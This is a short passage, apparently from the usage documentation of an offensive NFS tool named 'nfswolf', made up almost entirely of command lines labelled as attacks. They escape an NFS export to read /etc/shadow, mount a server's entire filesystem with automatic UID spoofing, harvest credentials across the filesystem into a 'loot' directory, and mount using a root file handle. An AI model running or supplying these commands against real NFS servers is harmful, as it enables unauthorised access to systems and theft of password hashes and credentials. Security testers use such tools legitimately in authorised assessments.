...
# Attack — escape and read a specific file
nfswolf attack read target --export /srv --escape --path /etc/shadow --gid 42

# Attack — escape and mount the entire filesystem
nfswolf mount target --export /srv --escape /mnt/escaped --auto-uid

# Attack — escape and harvest credentials from entire filesystem
nfswolf attack harvest target --export /srv --escape --output ./loot
```
...
nfswolf mount target --handle $ROOT_FH /mnt/escaped --auto-uid
